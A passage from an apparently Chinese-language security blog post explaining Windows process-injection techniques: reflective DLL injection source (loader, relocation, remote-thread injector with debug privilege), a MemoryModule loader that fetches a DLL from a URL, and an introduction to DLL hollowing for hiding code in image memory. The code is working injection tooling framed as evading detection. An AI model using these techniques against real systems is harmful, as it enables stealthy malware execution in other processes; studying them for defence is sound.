((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;OriginalFirstThunk );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; IAT</span><br><span class="line">	uiValueA &#x3D; ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;FirstThunk );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 遍历导入的函数</span><br><span class="line">	while( DEREF(uiValueA) )</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F; 如果是序号导入</span><br><span class="line">		if( uiValueD &amp;&amp; ((PIMAGE_THUNK_DATA)uiValueD)-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG )</span><br><span class="line">		&#123;</span><br><span class="line">			&#x2F;&#x2F; 获取上面LoadLibraryA加载的模块的NT头</span><br><span class="line">			uiExportDir &#x3D; uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line">			uiNameArray &#x3D; (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];</span><br><span class="line"></span><br><span class="line">			uiExportDir &#x3D; ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress );</span><br><span class="line">			uiAddressArray &#x3D; ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions );</span><br><span class="line"></span><br><span class="line">			&#x2F;&#x2F; 定位函数地址：首先计算目标函数在依赖DLL的导出地址表的偏移位置。这个位置的计算方法是通过取函数的序号并减去基序号(导出函数序号的最小值)得出来得的,然后这个偏移量再乘以sizeof(DWORD),就是目标函数在导出地址表的偏移位置。最后再加上uiAddressArray，此变量现在指向目标函数地址的指针</span><br><span class="line">			uiAddressArray +&#x3D; ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)-&gt;u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;Base ) * sizeof(DWORD) );</span><br><span class="line"></span><br><span class="line">			&#x2F;&#x2F; 写入到IAT</span><br><span class="line">			DEREF(uiValueA) &#x3D; ( uiLibraryAddress + DEREF_32(uiAddressArray) );</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			&#x2F;&#x2F; 如果是名称导入</span><br><span class="line">			uiValueB &#x3D; ( uiBaseAddress + DEREF(uiValueA) );</span><br><span class="line"></span><br><span class="line">			&#x2F;&#x2F; 通过GetProcAddress获取函数地址，写入IAT</span><br><span class="line">			DEREF(uiValueA) &#x3D; (ULONG_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)-&gt;Name );</span><br><span class="line">		&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>五、处理DLL重定位表</p>
+<p>在编译PE文件时，编译器通常会指定一个默认的基地址（Image Base），即首选的内存加载地址。当多个DLL或可执行文件试图加载到相同的首选地址时，冲突就会发生。为了避免这种冲突，Windows加载器可能需要将PE文件加载到不同于其首选地址的内存位置。这时，所有基于首选地址的指针和地址引用都需要进行调整，这就是重定位的作用。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 计算基址偏移量:当前DLL的实际加载地址减去预设的基地址</span><br><span class="line">uiLibraryAddress &#x3D; uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取重定位表的地址</span><br><span class="line">uiValueB &#x3D; (ULONG_PTR)&amp;((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 通过检查重定位表是否为空来判断是否存在重定位项</span><br><span class="line">if( ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;Size )</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; uiValueC指向第一个重定位块的地址</span><br><span class="line">    uiValueC &#x3D; ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;VirtualAddress );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 开始遍历所有重定位块</span><br><span class="line">    while( ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock )</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; 获取重定位块的地址</span><br><span class="line">        uiValueA &#x3D; ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;VirtualAddress );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 获取重定位块中包含的重定位项的数量</span><br><span class="line">        uiValueB &#x3D; ( ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) &#x2F; sizeof( IMAGE_RELOC );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; uiValueD设置为当前块中的第一个重定位项</span><br><span class="line">        uiValueD &#x3D; uiValueC + sizeof(IMAGE_BASE_RELOCATION);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 遍历重定位项</span><br><span class="line">        while( uiValueB-- )</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; 根据重定位项的类型来修正相应的地址</span><br><span class="line">            if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_DIR64 )</span><br><span class="line">                *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; uiLibraryAddress;</span><br><span class="line">            else if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_HIGHLOW )</span><br><span class="line">                *(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; (DWORD)uiLibraryAddress;</span><br><span class="line">            else if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_HIGH )</span><br><span class="line">                *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; HIWORD(uiLibraryAddress);</span><br><span class="line">            else if( ((PIMAGE_RELOC)uiValueD)-&gt;type &#x3D;&#x3D; IMAGE_REL_BASED_LOW )</span><br><span class="line">                *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)-&gt;offset) +&#x3D; LOWORD(uiLibraryAddress);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 遍历下一个重定位项</span><br><span class="line">            uiValueD +&#x3D; sizeof( IMAGE_RELOC );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 遍历下一个重定位块</span><br><span class="line">        uiValueC &#x3D; uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)-&gt;SizeOfBlock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>六、调用DLL入口点</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取DLL的入口点</span><br><span class="line">uiValueA &#x3D; ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.AddressOfEntryPoint );</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 刷新指令缓存,确保CPU的指令缓存没有旧的代码</span><br><span class="line">pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 调用DLLMAIN函数</span><br><span class="line">&#x2F;&#x2F; 此宏定义表示,如果DLL是通过LoadRemoteLibraryR注入的,则可使用第三个参数作为额外参数给DllMain</span><br><span class="line">#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</span><br><span class="line"></span><br><span class="line">((DLLMAIN)uiValueA)( (HINSTANCE), DLL_PROCESS_ATTACH, lpParameter );</span><br><span class="line">#else</span><br><span class="line">((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 返回入口点的地址</span><br><span class="line">return uiValueA;</span><br></pre></td></tr></table></figure>
+
+<p>七、在DLLMAIN中添加恶意操作</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240617003529139.png" alt="image-20240617003529139"></p>
+<p>至此恶意DLL以及导出函数构造完成。</p>
+<p>下面分析注入器的流程：首先项目通过读取本地dll文件到内存，然后加载到内存，后续可以改造为远程下载或者嵌入即可实现单PE。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ifdef WIN_X64</span><br><span class="line">	char * cpDllFile  &#x3D; &quot;reflective_dll.x64.dll&quot;;</span><br><span class="line">#else</span><br><span class="line">#ifdef WIN_X86</span><br><span class="line">	char * cpDllFile  &#x3D; &quot;reflective_dll.dll&quot;;</span><br><span class="line">#else WIN_ARM</span><br><span class="line">	char * cpDllFile  &#x3D; &quot;reflective_dll.arm.dll&quot;;</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">hFile &#x3D; CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );</span><br><span class="line">if( hFile &#x3D;&#x3D; INVALID_HANDLE_VALUE )</span><br><span class="line">    BREAK_WITH_ERROR( &quot;Failed to open the DLL file&quot; );</span><br><span class="line"></span><br><span class="line">dwLength &#x3D; GetFileSize( hFile, NULL );</span><br><span class="line">if( dwLength &#x3D;&#x3D; INVALID_FILE_SIZE || dwLength &#x3D;&#x3D; 0 )</span><br><span class="line">    BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 开辟新空间</span><br><span class="line">lpBuffer &#x3D; HeapAlloc( GetProcessHeap(), 0, dwLength );</span><br><span class="line">if( !lpBuffer )</span><br><span class="line">    BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );</span><br><span class="line">    </span><br><span class="line">&#x2F;&#x2F; 将DLL读取到新空间中</span><br><span class="line">if( ReadFile( hFile, lpBuffer, dwLength, &amp;dwBytesRead, NULL ) &#x3D;&#x3D; FALSE )</span><br><span class="line">    BREAK_WITH_ERROR( &quot;Failed to alloc a buffer!&quot; );</span><br></pre></td></tr></table></figure>
+
+<p>提升当前进程权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) )</span><br><span class="line">&#123;</span><br><span class="line">    priv.PrivilegeCount           &#x3D; 1;</span><br><span class="line">    priv.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">    if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;priv.Privileges[0].Luid ) )</span><br><span class="line">        AdjustTokenPrivileges( hToken, FALSE, &amp;priv, 0, NULL, NULL );</span><br><span class="line"></span><br><span class="line">    CloseHandle( hToken );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打开进程，通过 <strong>LoadRemoteLibraryR</strong> 将dll注入到目标进程中。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 打开目标进程</span><br><span class="line">hProcess &#x3D; OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );</span><br><span class="line">if( !hProcess )</span><br><span class="line">    BREAK_WITH_ERROR( &quot;Failed to open the target process&quot; );</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 通过LoadRemoteLibraryR注入dll到进程中</span><br><span class="line">hModule &#x3D; LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL );</span><br><span class="line">if( !hModule )</span><br><span class="line">    BREAK_WITH_ERROR( &quot;Failed to inject the DLL&quot; );</span><br><span class="line"></span><br><span class="line">printf( &quot;[+] Injected the &#39;%s&#39; DLL into process %d.&quot;, cpDllFile, dwProcessId );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject( hModule, -1 );</span><br></pre></td></tr></table></figure>
+
+<p>来分析下 <strong>LoadRemoteLibraryR</strong> </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 通过GetReflectiveLoaderOffset找到ReflectiveLoader函数对应的偏移</span><br><span class="line">dwReflectiveLoaderOffset &#x3D; GetReflectiveLoaderOffset( lpBuffer );</span><br><span class="line">if( !dwReflectiveLoaderOffset )</span><br><span class="line">	break;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在目标进程中开辟空间</span><br><span class="line">lpRemoteLibraryBuffer &#x3D; VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); </span><br><span class="line">if( !lpRemoteLibraryBuffer )</span><br><span class="line">	break;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将恶意DLL写到目标进程中</span><br><span class="line">if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) )</span><br><span class="line">	break;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 通过偏移找到ReflectiveLoader函数地址</span><br><span class="line">lpReflectiveLoader &#x3D; (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 远程调用ReflectiveLoader</span><br><span class="line">hThread &#x3D; CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &amp;dwThreadId );</span><br></pre></td></tr></table></figure>
+
+<p>再分析 <strong>GetReflectiveLoaderOffset</strong> 是怎么找到DLL的ReflectiveLoader偏移。通过遍历DLL的导出表找到ReflectiveLoader，并计算出相对于DLL基地址的偏移量。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )</span><br><span class="line">&#123;	</span><br><span class="line">	UINT_PTR uiBaseAddress   &#x3D; 0;</span><br><span class="line">	UINT_PTR uiExportDir     &#x3D; 0;</span><br><span class="line">	UINT_PTR uiNameArray     &#x3D; 0;</span><br><span class="line">	UINT_PTR uiAddressArray  &#x3D; 0;</span><br><span class="line">	UINT_PTR uiNameOrdinals  &#x3D; 0;</span><br><span class="line">	DWORD dwCounter          &#x3D; 0;</span><br><span class="line">#ifdef WIN_X64</span><br><span class="line">	DWORD dwCompiledArch &#x3D; 2;</span><br><span class="line">#else</span><br><span class="line">	&#x2F;&#x2F; This will catch Win32 and WinRT.</span><br><span class="line">	DWORD dwCompiledArch &#x3D; 1;</span><br><span class="line">#endif</span><br><span class="line">	</span><br><span class="line">    &#x2F;&#x2F; uiBaseAddress初始化为dll的基址</span><br><span class="line">	uiBaseAddress &#x3D; (UINT_PTR)lpReflectiveDllBuffer;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 获取DLL的PE头</span><br><span class="line">	uiExportDir &#x3D; uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 检查DLL的架构(x32 or x64)</span><br><span class="line">	if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic &#x3D;&#x3D; 0x010B ) &#x2F;&#x2F; PE32</span><br><span class="line">	&#123;</span><br><span class="line">		if( dwCompiledArch !&#x3D; 1 )</span><br><span class="line">			return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	else if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic &#x3D;&#x3D; 0x020B ) &#x2F;&#x2F; PE64</span><br><span class="line">	&#123;</span><br><span class="line">		if( dwCompiledArch !&#x3D; 2 )</span><br><span class="line">			return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 定位导出表</span><br><span class="line">	uiNameArray &#x3D; (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; 获取导出表在文件状态下的地址</span><br><span class="line">	uiExportDir &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 获取导出函数名称表在文件状态下的地址</span><br><span class="line">	uiNameArray &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 获取导出函数地址表在文件状态下的地址</span><br><span class="line">	uiAddressArray &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 获取导出函数序号表在文件状态下的地址</span><br><span class="line">	uiNameOrdinals &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );	</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 获取通过函数名称来导出的数量</span><br><span class="line">	dwCounter &#x3D; ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; 遍历所有导出函数</span><br><span class="line">	while( dwCounter-- )</span><br><span class="line">	&#123;	</span><br><span class="line">        &#x2F;&#x2F; 获取导出函数的名称</span><br><span class="line">		char * cpExportedFunctionName &#x3D; (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));</span><br><span class="line">		</span><br><span class="line">        &#x2F;&#x2F; 检查导出函数的名称是否是“ReflectiveLoader”</span><br><span class="line">		if( strstr( cpExportedFunctionName, &quot;ReflectiveLoader&quot; ) !&#x3D; NULL )</span><br><span class="line">		&#123;</span><br><span class="line">			&#x2F;&#x2F; 定位导出函数地址表</span><br><span class="line">			uiAddressArray &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );	</span><br><span class="line">	</span><br><span class="line">			&#x2F;&#x2F; uiNameOrdinals提供ReflectiveLoader函数的序号，并通过此序号与导出函数地址表的起始位置计算,从而得出ReflectiveLoader函数的地址</span><br><span class="line">			uiAddressArray +&#x3D; ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );</span><br><span class="line"></span><br><span class="line">			&#x2F;&#x2F; 返回ReflectiveLoader函数在文件状态下的偏移量</span><br><span class="line">			return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">        &#x2F;&#x2F; 指向下一个导出函数的名称</span><br><span class="line">		uiNameArray +&#x3D; sizeof(DWORD);</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; 指向下一个导出函数的序号</span><br><span class="line">		uiNameOrdinals +&#x3D; sizeof(WORD);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>至此注入器分析完成。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240617012803371.png" alt="image-20240617012803371"></p>
+<p>最后该方法还有变形应用 <a target="_blank" rel="noopener" href="https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation#jian-jie">ReflectiveDLLInjection变形应用</a>，更好的隐藏了特征。</p>
+<h2 id="Memory-Module"><a href="#Memory-Module" class="headerlink" title="Memory Module"></a>Memory Module</h2><p>memory module（内存模块）过程非常类似反射DLL加载，二者实现的都是模拟PE加载过程、在内存中加载dll，但是内存模块更为精细，主要差别为：一、反射dll直接将所有代码copy到目标的一片RWX的内存中，内存模块则是按照将不同节进行不同的标记，可以将没有用的节释放掉，因此内存模块在内存中表现的更像正常DLL的属性分布因此更具隐蔽性。二、反射dll所有操作都是由目标进程进行，内存模块操作由本身exe进行自身注入。具体参看项目：<a target="_blank" rel="noopener" href="https://github.com/fancycode/MemoryModule">https://github.com/fancycode/MemoryModule</a></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1719931962740.png" alt="QQ_1719931962740"></p>
+<p>反射DLL：会直接多出两片private的RWX属性内存。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240620105057906.png" alt="image-20240620105057906"></p>
+<p>内存模块：</p>
+<p>引入 <code>MemoryModule.h</code> 和 <code>MemoryModule.c</code> ，同时改造成远程拉取DLL到内存中。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include &lt;tchar.h&gt;</span><br><span class="line">#include &quot;MemoryModule.h&quot;</span><br><span class="line"></span><br><span class="line">#pragma comment(lib, &quot;ws2_32.lib&quot;)</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);</span><br><span class="line"></span><br><span class="line">char* readUrl(const char* szUrl, long&amp; fileSize)</span><br><span class="line">&#123;</span><br><span class="line">   ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void LoadFromMemory(void)</span><br><span class="line">&#123;</span><br><span class="line">    void* data;</span><br><span class="line">    size_t size;</span><br><span class="line">    HMEMORYMODULE handle;</span><br><span class="line">    Module DllMain;</span><br><span class="line">    long fileSize;</span><br><span class="line"></span><br><span class="line">    data &#x3D; (void *)readUrl(&quot;http:&#x2F;&#x2F;example.com&#x2F;test.dll&quot;,fileSize);</span><br><span class="line">    if (data &#x3D;&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; &quot;[-]Open DLL Fail&quot; &lt;&lt; endl;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">	&#x2F;&#x2F; 自动触发dllmain</span><br><span class="line">    handle &#x3D; MemoryLoadLibrary(data, size);</span><br><span class="line">    MemoryFreeLibrary(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    LoadFromMemory();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>内存分布还算正常，但还是存在显眼的 “private” RX内存。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240624150049093.png" alt="image-20240624150049093"></p>
+<p>PS：由于memory module的特点，项目无法做到直接与进程注入相结合，目前有一个与python相结合的项目 <a target="_blank" rel="noopener" href="https://github.com/naksyn/PythonMemoryModule%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%AA%E6%9D%A5%E6%9C%89%E5%85%AC%E5%BC%80%E9%A1%B9%E7%9B%AE%E8%83%BD%E5%92%8C%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%9B%B8%E7%BB%93%E5%90%88%E5%B0%B1%E6%AF%94%E8%BE%83%E5%A5%BD%E4%BA%86">https://github.com/naksyn/PythonMemoryModule，如果未来有公开项目能和进程注入相结合就比较好了</a></p>
+<h2 id="DLL-Hollowing"><a href="#DLL-Hollowing" class="headerlink" title="DLL Hollowing"></a>DLL Hollowing</h2><h3 id="内存类型"><a href="#内存类型" class="headerlink" title="内存类型"></a>内存类型</h3><p>在Windows虚拟内存管理中，通过 <strong>MEMORY_BASIC_INFORMATION</strong> 结构体描述某范围内内存块的具体信息：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _MEMORY_BASIC_INFORMATION &#123;</span><br><span class="line">  PVOID  BaseAddress;		&#x2F;&#x2F;指向查询的内存区域的起始地址</span><br><span class="line">  PVOID  AllocationBase;	&#x2F;&#x2F;指向分配的内存块的起始地址。 BaseAddress 成员指向的页面包含在此分配范围内。</span><br><span class="line">  DWORD  AllocationProtect;	&#x2F;&#x2F;分配时的内存保护属性。例如，PAGE_READONLY、PAGE_READWRITE 等</span><br><span class="line">  WORD   PartitionId;		&#x2F;&#x2F;标识内存区域所属的分区 ID, Win10引入</span><br><span class="line">  SIZE_T RegionSize;		&#x2F;&#x2F;从基址开始的区域大小，其中所有页面都具有相同的属性（以字节为单位）</span><br><span class="line">  DWORD  State;				&#x2F;&#x2F;内存块的当前状态。 MEM_COMMIT（已提交）、MEM_RESERVE（已保留）和 MEM_FREE（空闲）</span><br><span class="line">  DWORD  Protect;			&#x2F;&#x2F;内存块的当前保护属性。可能的值包括 PAGE_NOACCESS、PAGE_READONLY、PAGE_READWRITE 等</span><br><span class="line">  DWORD  Type;				&#x2F;&#x2F;内存块的类型。可能的值包括 MEM_IMAGE、MEM_MAPPED和 MEM_PRIVATE</span><br><span class="line">&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;</span><br></pre></td></tr></table></figure>
+
+<p>在打开SystemInformer.exe查看内存区域时，可对应内存块类型的三种commit：<strong>Private、Mapped、Image</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1719989713022.png" alt="QQ_1719989713022"></p>
+<p>这三种内存块类型的差异主要为：</p>
+<ul>
+<li><p>Private：标识内存块是由进程私有使用的，通常由内存分配函数（如 VirtualAlloc）分配</p>
+</li>
+<li><p>Image：在系统加载运行可执行文件时，标识加载到内存中的可执行文件（PE）和所需动态链接库（DLL）的映像文件，其对应的RX区域为.text段</p>
+</li>
+<li><p>Mapped：标识内存块是通过内存映射文件（memory-mapped files）分配的。这些内存块与磁盘上的文件内容直接关联如：</p>
+<p>.db、.mui和.dat文件从磁盘映射到内存中供应用程序读取</p>
+</li>
+</ul>
+<hr>
+<p>在了解内存块类型差异后，结合前面几种技术所展现的 <strong>Private</strong> 内存类型的明显特征，思考如果将恶意代码隐藏到另外两种内存类型（Mapped或Image）中，是不是就会有较好的隐匿效果呢？DLL Hollowing就是这样的一种技术，其主要思路为：<strong>在目标进程内主动加载一个系统中合法的dll，此时对应内存类型为：Image，然后将dll对应的内存内容覆写为恶意代码，通过执行入口点函数/PE加载 启动恶意代码，同时由于使用了 LoadLibrary系列API、文件映射等手段，避免了使用 VirtualAllocEx,WriteProcessMemory等敏感API</strong></p>
+<p>另外在实现此技术时应该注意以下几点：</p>
+<ul>
+<li>其IMAGE_SECTION_HEADER.Misc.VirtualSize大于或等于被植入的 shellcode 的大小</li>
+<li>此类 DLL 不应加载到目标进程中，因为这意味着它们的修改可能会导致崩溃</li>
+</ul>
+<p>很符合 “镂空” 这个词 :)，我将此分为五部分：</p>
+<ul>
+<li>经典Dll Hollowing</li>
+<li>Module Overloading</li>
+<li>Module Stomping</li>
+<li>bypass cfg</li>
+<li>远程注入</li>
+</ul>
+<h3 id="经典Dll-Hollowing"><a href="#经典Dll-Hollowing" class="headerlink" title="经典Dll Hollowing"></a>经典Dll Hollowing</h3><p>此处和Module Overloading的学习直接分析项目：<a target="_blank" rel="noopener" href="https://github.com/hasherezade/module_overloading%EF%BC%8C%E6%AD%A4%E9%A1%B9%E7%9B%AE%E9%80%9A%E8%BF%87libPeConv%E5%BA%93%E4%B8%93%E9%97%A8%E7%94%A8%E4%BA%8E%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%93%8D%E4%BD%9CPE">https://github.com/hasherezade/module_overloading，此项目通过libPeConv库专门用于加载和操作PE</a></p>
+<p>特点：通过 <strong>LoadLibraryA/LoadLibraryEx 引入合法Dll，原项目使用LoadLibraryA，这里修改为LoadLibraryEx，只加载Dll但不执行Dllmain函数</strong></p>
+<p>首先将evil PE（implant_name），完整内容copy到buffer中</p>
